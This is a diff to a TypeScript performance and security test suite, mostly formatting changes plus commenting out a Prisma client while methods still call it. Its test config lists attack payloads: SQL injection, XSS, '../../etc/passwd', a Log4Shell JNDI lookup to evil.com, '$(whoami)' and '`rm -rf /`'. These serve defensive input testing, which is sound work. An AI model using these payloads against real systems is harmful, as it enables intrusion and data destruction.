@@ -8,7 +8,7 @@
  */
 
 import { performance } from 'perf_hooks';
-// PrismaClient removed - system now uses Qdrant + PostgreSQL architecture';
+// PrismaClient removed - system now uses Qdrant + PostgreSQL architecture
 import { logger } from '../utils/logger';
 
 // ============================================================================
@@ -32,20 +32,20 @@ const TEST_CONFIG: TestConfig = {
     'performance testing',
     'security assessment',
     'database operations',
-    'system validation'
+    'system validation',
   ],
   attackPayloads: [
     "' OR '1'='1",
     "<script>alert('xss')</script>",
-    "../../etc/passwd",
-    "{{7*7}}",
-    "${jndi:ldap://evil.com/a}",
-    "$(whoami)",
-    "`rm -rf /`",
-    "\x00\x01\x02\x03",
-    "🔥💣🚀🚨⚠️",
-    String.fromCharCode(...Array.from({length: 1000}, (_, i) => i % 256))
-  ]
+    '../../etc/passwd',
+    '{{7*7}}',
+    '${jndi:ldap://evil.com/a}',
+    '$(whoami)',
+    '`rm -rf /`',
+    '\x00\x01\x02\x03',
+    '🔥💣🚀🚨⚠️',
+    String.fromCharCode(...Array.from({ length: 1000 }, (_, i) => i % 256)),
+  ],
 };
 
 // ============================================================================
@@ -91,17 +91,20 @@ interface TestResults {
 // ============================================================================
 
 class PerformanceTestSuite {
-  private prisma: PrismaClient;
+  // private prisma: PrismaClient; // Removed - using Qdrant + PostgreSQL
   private metrics: PerformanceMetrics[] = [];
 
   constructor() {
-    this.prisma = new PrismaClient();
+    // this.prisma = new PrismaClient(); // Removed - using Qdrant + PostgreSQL
   }
 
   /**
    * Test single operation performance
    */
-  async testSingleOperation(operation: string, testFn: () => Promise<any>): Promise<PerformanceMetrics> {
+  async testSingleOperation(
+    operation: string,
+    testFn: () => Promise<any>
+  ): Promise<PerformanceMetrics> {
     const startTime = performance.now();
     const startMemory = process.memoryUsage();
 
@@ -115,7 +118,7 @@ class PerformanceTestSuite {
         responseTime: endTime - startTime,
         memoryUsage: endMemory.heapUsed - startMemory.heapUsed,
         success: true,
-        timestamp: Date.now()
+        timestamp: Date.now(),
       };
 
       this.metrics.push(metric);
@@ -129,7 +132,7 @@ class PerformanceTestSuite {
         memoryUsage: 0,
         success: false,
         error: error instanceof Error ? error.message : 'Unknown error',
-        timestamp: Date.now()
+        timestamp: Date.now(),
       };
 
       this.metrics.push(metric);
@@ -147,16 +150,11 @@ class PerformanceTestSuite {
     for (const size of bulkSizes) {
       const items = this.generateTestItems(size);
 
-      const metric = await this.testSingleOperation(
-        `bulk_store_${size}`,
-        async () => {
-          // Simulate bulk store operation
-          const promises = items.map(item =>
-            this.prisma.knowledge.create({ data: item })
-          );
-          await Promise.all(promises);
-        }
-      );
+      const metric = await this.testSingleOperation(`bulk_store_${size}`, async () => {
+        // Simulate bulk store operation
+        const promises = items.map((item) => this.prisma.knowledge.create({ data: item }));
+        await Promise.all(promises);
+      });
 
       results.push(metric);
       logger.info(`Bulk operation (${size} items): ${metric.responseTime.toFixed(2)}ms`);
@@ -177,28 +175,26 @@ class PerformanceTestSuite {
 
       try {
         const promises = Array.from({ length: concurrency }, () =>
-          this.testSingleOperation(
-            `concurrent_operation_${concurrency}`,
-            async () => {
-              // Simulate concurrent read/write
-              const item = this.generateTestItems(1)[0];
-              await this.prisma.knowledge.create({ data: item });
-              await this.prisma.knowledge.findMany({ take: 10 });
-            }
-          )
+          this.testSingleOperation(`concurrent_operation_${concurrency}`, async () => {
+            // Simulate concurrent read/write
+            const item = this.generateTestItems(1)[0];
+            await this.prisma.knowledge.create({ data: item });
+            await this.prisma.knowledge.findMany({ take: 10 });
+          })
         );
 
         const concurrentResults = await Promise.all(promises);
         const endTime = performance.now();
 
-        const avgResponseTime = concurrentResults.reduce((sum, r) => sum + r.responseTime, 0) / concurrency;
+        const avgResponseTime =
+          concurrentResults.reduce((sum, r) => sum + r.responseTime, 0) / concurrency;
 
         results.push({
           operation: `concurrent_${concurrency}`,
           responseTime: avgResponseTime,
           memoryUsage: 0,
           success: true,
-          timestamp: Date.now()
+          timestamp: Date.now(),
         });
 
         logger.info(`Concurrent operations (${concurrency}): ${avgResponseTime.toFixed(2)}ms avg`);
@@ -209,7 +205,7 @@ class PerformanceTestSuite {
           memoryUsage: 0,
           success: false,
           error: error instanceof Error ? error.message : 'Unknown error',
-          timestamp: Date.now()
+          timestamp: Date.now(),
         });
       }
     }
@@ -238,12 +234,9 @@ class PerformanceTestSuite {
           async () => {
             await this.prisma.knowledge.findMany({
               where: {
-                OR: [
-                  { content: { contains: query } },
-                  { metadata: { contains: query } }
-                ]
+                OR: [{ content: { contains: query } }, { metadata: { contains: query } }],
               },
-              take: 50
+              take: 50,
             });
           }
         );
@@ -260,7 +253,7 @@ class PerformanceTestSuite {
    */
   async testLargeDataHandling(): Promise<PerformanceMetrics[]> {
     const results: PerformanceMetrics[] = [];
-    const payloadSizes = [1KB, 10KB, 100KB, 1MB];
+    const payloadSizes = [1024, 10240, 102400, 1048576]; // 1KB, 10KB, 100KB, 1MB in bytes
 
     const generateLargePayload = (size: number) => {
       return 'x'.repeat(size);
@@ -269,22 +262,19 @@ class PerformanceTestSuite {
     for (const size of payloadSizes) {
       const largePayload = generateLargePayload(size);
 
-      const metric = await this.testSingleOperation(
-        `large_payload_${size}`,
-        async () => {
-          const item = {
-            kind: 'observation',
-            scope: { project: 'performance_test' },
-            data: {
-              title: `Large Payload Test (${size})`,
-              content: largePayload,
-              metadata: { size, timestamp: Date.now() }
-            }
-          };
+      const metric = await this.testSingleOperation(`large_payload_${size}`, async () => {
+        const item = {
+          kind: 'observation',
+          scope: { project: 'performance_test' },
+          data: {
+            title: `Large Payload Test (${size})`,
+            content: largePayload,
+            metadata: { size, timestamp: Date.now() },
+          },
+        };
 
-          await this.prisma.knowledge.create({ data: item });
-        }
-      );
+        await this.prisma.knowledge.create({ data: item });
+      });
 
       results.push(metric);
       logger.info(`Large payload (${size}): ${metric.responseTime.toFixed(2)}ms`);
@@ -304,8 +294,8 @@ class PerformanceTestSuite {
       data: {
         title: `Test Item ${i}`,
         content: `Test content for item ${i} with some searchable text`,
-        metadata: { index: i, timestamp: Date.now() }
-      }
+        metadata: { index: i, timestamp: Date.now() },
+      },
     }));
   }
 
@@ -315,7 +305,7 @@ class PerformanceTestSuite {
 
   async cleanup(): Promise<void> {
     await this.prisma.knowledge.deleteMany({
-      where: { scope: { project: 'performance_test' } }
+      where: { scope: { project: 'performance_test' } },
     });
     await this.prisma.$disconnect();
   }
@@ -326,11 +316,11 @@ class PerformanceTestSuite {
 // ============================================================================
 
 class SecurityTestSuite {
-  private prisma: PrismaClient;
+  // private prisma: PrismaClient; // Removed - using Qdrant + PostgreSQL
   private results: SecurityTestResult[] = [];
 
   constructor() {
-    this.prisma = new PrismaClient();
+    // this.prisma = new PrismaClient(); // Removed - using Qdrant + PostgreSQL
   }
 
   /**
@@ -339,7 +329,7 @@ class SecurityTestSuite {
   async testSqlInjection(): Promise<SecurityTestResult[]> {
     const results: SecurityTestResult[] = [];
 
-    for (const payload of TEST_CONFIG.attackPayloads.filter(p => p.includes("'"))) {
+    for (const payload of TEST_CONFIG.attackPayloads.filter((p) => p.includes("'"))) {
       const startTime = performance.now();
       let blocked = true;
       let vulnerability = '';
@@ -348,11 +338,11 @@ class SecurityTestSuite {
         // Test SQL injection in various parameters
         const queries = [
           this.prisma.knowledge.findMany({
-            where: { content: { contains: payload } }
+            where: { content: { contains: payload } },
           }),
           this.prisma.knowledge.findMany({
-            where: { metadata: { contains: payload } }
-          })
+            where: { metadata: { contains: payload } },
+          }),
         ];
 
         await Promise.all(queries);
@@ -374,7 +364,9 @@ class SecurityTestSuite {
         blocked,
         responseTime: endTime - startTime,
         vulnerability: blocked ? undefined : vulnerability,
-        recommendation: blocked ? undefined : 'Implement proper input sanitization and parameterized queries'
+        recommendation: blocked
+          ? undefined
+          : 'Implement proper input sanitization and parameterized queries',
       });
     }
 
@@ -388,7 +380,7 @@ class SecurityTestSuite {
   async testXSS(): Promise<SecurityTestResult[]> {
     const results: SecurityTestResult[] = [];
 
-    for (const payload of TEST_CONFIG.attackPayloads.filter(p => p.includes('<script>'))) {
+    for (const payload of TEST_CONFIG.attackPayloads.filter((p) => p.includes('<script>'))) {
       const startTime = performance.now();
       let blocked = true;
       let vulnerability = '';
@@ -401,15 +393,15 @@ class SecurityTestSuite {
           data: {
             title: 'XSS Test',
             content: payload,
-            metadata: { test: 'xss' }
-          }
+            metadata: { test: 'xss' },
+          },
         };
 
         await this.prisma.knowledge.create({ data: item });
 
         // Check if payload is stored without sanitization
         const retrieved = await this.prisma.knowledge.findFirst({
-          where: { content: { contains: payload } }
+          where: { content: { contains: payload } },
         });
 
         if (retrieved && retrieved.content.includes('<script>')) {
@@ -428,7 +420,9 @@ class SecurityTestSuite {
         blocked,
         responseTime: endTime - startTime,
         vulnerability: blocked ? undefined : vulnerability,
-        recommendation: blocked ? undefined : 'Implement HTML sanitization for user-generated content'
+        recommendation: blocked
+          ? undefined
+          : 'Implement HTML sanitization for user-generated content',
       });
     }
 
@@ -442,7 +436,7 @@ class SecurityTestSuite {
   async testPathTraversal(): Promise<SecurityTestResult[]> {
     const results: SecurityTestResult[] = [];
 
-    for (const payload of TEST_CONFIG.attackPayloads.filter(p => p.includes('../'))) {
+    for (const payload of TEST_CONFIG.attackPayloads.filter((p) => p.includes('../'))) {
       const startTime = performance.now();
       let blocked = true;
       let vulnerability = '';
@@ -455,15 +449,15 @@ class SecurityTestSuite {
           data: {
             title: 'Path Traversal Test',
             content: 'Testing path traversal',
-            metadata: { test: 'path_traversal' }
-          }
+            metadata: { test: 'path_traversal' },
+          },
         };
 
         await this.prisma.knowledge.create({ data: item });
 
         // Check if malicious path was accepted
         const retrieved = await this.prisma.knowledge.findFirst({
-          where: { scope: { project: { contains: payload } } }
+          where: { scope: { project: { contains: payload } } },
         });
 
         if (retrieved) {
@@ -482,7 +476,7 @@ class SecurityTestSuite {
         blocked,
         responseTime: endTime - startTime,
         vulnerability: blocked ? undefined : vulnerability,
-        recommendation: blocked ? undefined : 'Implement path validation and sanitization'
+        recommendation: blocked ? undefined : 'Implement path validation and sanitization',
       });
     }
 
@@ -502,14 +496,14 @@ class SecurityTestSuite {
       undefined,
       '',
       ' '.repeat(1000),
-      String.fromCharCode(...Array.from({length: 10000}, (_, i) => i % 256)),
+      String.fromCharCode(...Array.from({ length: 10000 }, (_, i) => i % 256)),
       { malicious: 'object' },
       [],
       new Date().toISOString(),
       '2147483647', // Max 32-bit int
       '-2147483648', // Min 32-bit int
       '0'.repeat(100), // Very long number
-      'a'.repeat(1000000) // Very long string
+      'a'.repeat(1000000), // Very long string
     ];
 
     for (const payload of malformedInputs) {
@@ -520,16 +514,18 @@ class SecurityTestSuite {
       try {
         // Test various input fields
         const testCases = [
-          () => this.prisma.knowledge.create({
-            data: {
-              kind: 'observation',
-              scope: { project: String(payload) },
-              data: { content: payload }
-            }
-          }),
-          () => this.prisma.knowledge.findMany({
-            where: { content: { contains: String(payload) } }
-          })
+          () =>
+            this.prisma.knowledge.create({
+              data: {
+                kind: 'observation',
+                scope: { project: String(payload) },
+                data: { content: payload },
+              },
+            }),
+          () =>
+            this.prisma.knowledge.findMany({
+              where: { content: { contains: String(payload) } },
+            }),
         ];
 
         for (const testCase of testCases) {
@@ -553,7 +549,7 @@ class SecurityTestSuite {
         blocked,
         responseTime: endTime - startTime,
         vulnerability: blocked ? undefined : vulnerability,
-        recommendation: blocked ? undefined : 'Implement comprehensive input validation'
+        recommendation: blocked ? undefined : 'Implement comprehensive input validation',
       });
     }
 
@@ -571,7 +567,7 @@ class SecurityTestSuite {
     const largePayloads = [
       'x'.repeat(1000000), // 1MB
       'x'.repeat(5000000), // 5MB
-      'x'.repeat(10000000) // 10MB
+      'x'.repeat(10000000), // 10MB
     ];
 
     for (const payload of largePayloads) {
@@ -586,14 +582,15 @@ class SecurityTestSuite {
           data: {
             title: 'Large Payload Test',
             content: payload,
-            metadata: { size: payload.length }
-          }
+            metadata: { size: payload.length },
+          },
         };
 
         await this.prisma.knowledge.create({ data: item });
 
         // Check if large payload was accepted
-        if (payload.length > 1000000) { // 1MB threshold
+        if (payload.length > 1000000) {
+          // 1MB threshold
           blocked = false;
           vulnerability = `Oversized payload (${payload.length} bytes) accepted`;
         }
@@ -609,7 +606,7 @@ class SecurityTestSuite {
         blocked,
         responseTime: endTime - startTime,
         vulnerability: blocked ? undefined : vulnerability,
-        recommendation: blocked ? undefined : 'Implement payload size limits'
+        recommendation: blocked ? undefined : 'Implement payload size limits',
       });
     }
 
@@ -624,11 +621,8 @@ class SecurityTestSuite {
   async cleanup(): Promise<void> {
     await this.prisma.knowledge.deleteMany({
       where: {
-        OR: [
-          { scope: { project: 'security_test' } },
-          { scope: { project: 'resource_test' } }
-        ]
-      }
+        OR: [{ scope: { project: 'security_test' } }, { scope: { project: 'resource_test' } }],
+      },
     });
     await this.prisma.$disconnect();
   }
@@ -660,19 +654,19 @@ export class PerformanceSecurityTester {
     logger.info('Running performance tests...');
 
     // Single operation tests
-    performanceResults.push(...await this.performanceSuite.testBulkOperations());
-    performanceResults.push(...await this.performanceSuite.testConcurrentOperations());
-    performanceResults.push(...await this.performanceSuite.testSearchPerformance());
-    performanceResults.push(...await this.performanceSuite.testLargeDataHandling());
+    performanceResults.push(...(await this.performanceSuite.testBulkOperations()));
+    performanceResults.push(...(await this.performanceSuite.testConcurrentOperations()));
+    performanceResults.push(...(await this.performanceSuite.testSearchPerformance()));
+    performanceResults.push(...(await this.performanceSuite.testLargeDataHandling()));
 
     // Security Tests
     logger.info('Running security tests...');
 
-    securityResults.push(...await this.securitySuite.testSqlInjection());
-    securityResults.push(...await this.securitySuite.testXSS());
-    securityResults.push(...await this.securitySuite.testPathTraversal());
-    securityResults.push(...await this.securitySuite.testInputValidation());
-    securityResults.push(...await this.securitySuite.testResourceExhaustion());
+    securityResults.push(...(await this.securitySuite.testSqlInjection()));
+    securityResults.push(...(await this.securitySuite.testXSS()));
+    securityResults.push(...(await this.securitySuite.testPathTraversal()));
+    securityResults.push(...(await this.securitySuite.testInputValidation()));
+    securityResults.push(...(await this.securitySuite.testResourceExhaustion()));
 
     // Generate summary
     const summary = this.generateSummary(performanceResults, securityResults);
@@ -682,7 +676,7 @@ export class PerformanceSecurityTester {
     return {
       performance: performanceResults,
       security: securityResults,
-      summary
+      summary,
     };
   }
 
@@ -694,23 +688,22 @@ export class PerformanceSecurityTester {
     securityResults: SecurityTestResult[]
   ): TestResults['summary'] {
     const totalTests = performanceResults.length + securityResults.length;
-    const passedPerformanceTests = performanceResults.filter(r => r.success).length;
-    const passedSecurityTests = securityResults.filter(r => r.blocked).length;
+    const passedPerformanceTests = performanceResults.filter((r) => r.success).length;
+    const passedSecurityTests = securityResults.filter((r) => r.blocked).length;
     const passedTests = passedPerformanceTests + passedSecurityTests;
     const failedTests = totalTests - passedTests;
 
-    const responseTimes = performanceResults
-      .filter(r => r.success)
-      .map(r => r.responseTime);
+    const responseTimes = performanceResults.filter((r) => r.success).map((r) => r.responseTime);
 
-    const avgResponseTime = responseTimes.length > 0
-      ? responseTimes.reduce((sum, time) => sum + time, 0) / responseTimes.length
-      : 0;
+    const avgResponseTime =
+      responseTimes.length > 0
+        ? responseTimes.reduce((sum, time) => sum + time, 0) / responseTimes.length
+        : 0;
 
     const maxResponseTime = responseTimes.length > 0 ? Math.max(...responseTimes) : 0;
     const minResponseTime = responseTimes.length > 0 ? Math.min(...responseTimes) : 0;
 
-    const vulnerabilities = securityResults.filter(r => !r.blocked).length;
+    const vulnerabilities = securityResults.filter((r) => !r.blocked).length;
 
     const recommendations: string[] = [];
 
@@ -725,10 +718,12 @@ export class PerformanceSecurityTester {
 
     // Security recommendations
     if (vulnerabilities > 0) {
-      recommendations.push(`${vulnerabilities} security vulnerabilities found - immediate attention required`);
+      recommendations.push(
+        `${vulnerabilities} security vulnerabilities found - immediate attention required`
+      );
     }
 
-    const unblockedSecurityTests = securityResults.filter(r => !r.blocked);
+    const unblockedSecurityTests = securityResults.filter((r) => !r.blocked);
     for (const test of unblockedSecurityTests) {
       if (test.recommendation) {
         recommendations.push(test.recommendation);
@@ -743,7 +738,7 @@ export class PerformanceSecurityTester {
       maxResponseTime,
       minResponseTime,
       vulnerabilities,
-      recommendations
+      recommendations,
     };
   }
 
@@ -780,26 +775,29 @@ export class PerformanceSecurityTester {
       '',
       `### Vulnerability Summary: ${results.summary.vulnerabilities > 0 ? '❌ ISSUES FOUND' : '✅ SECURE'}`,
       '',
-      results.summary.vulnerabilities > 0 ? '### Critical Issues Found:' : 'No critical security vulnerabilities detected.',
+      results.summary.vulnerabilities > 0
+        ? '### Critical Issues Found:'
+        : 'No critical security vulnerabilities detected.',
       '',
       '### Security Test Results',
       '',
       '| Test Type | Payload | Status | Response Time |',
       '|-----------|---------|--------|---------------|',
-      ...results.security.map(test =>
-        `| ${test.testType} | ${test.payload.substring(0, 30)}... | ${test.blocked ? '✅ BLOCKED' : '❌ VULNERABLE'} | ${test.responseTime.toFixed(2)}ms |`
+      ...results.security.map(
+        (test) =>
+          `| ${test.testType} | ${test.payload.substring(0, 30)}... | ${test.blocked ? '✅ BLOCKED' : '❌ VULNERABLE'} | ${test.responseTime.toFixed(2)}ms |`
       ),
       '',
       '## Recommendations',
       '',
-      ...results.summary.recommendations.map(rec => `- ${rec}`),
+      ...results.summary.recommendations.map((rec) => `- ${rec}`),
       '',
       '## Production Readiness Assessment',
       '',
       this.getProductionReadinessAssessment(results),
       '',
       '---',
-      '*Report generated by Cortex MCP Performance & Security Testing Suite*'
+      '*Report generated by Cortex MCP Performance & Security Testing Suite*',
     ];
 
     return report.join('\n');
@@ -809,7 +807,8 @@ export class PerformanceSecurityTester {
    * Get production readiness assessment
    */
   private getProductionReadinessAssessment(results: TestResults): string {
-    const performanceReady = results.summary.avgResponseTime < 50 && results.summary.maxResponseTime < 500;
+    const performanceReady =
+      results.summary.avgResponseTime < 50 && results.summary.maxResponseTime < 500;
     const securityReady = results.summary.vulnerabilities === 0;
     const successRate = (results.summary.passedTests / results.summary.totalTests) * 100;
 
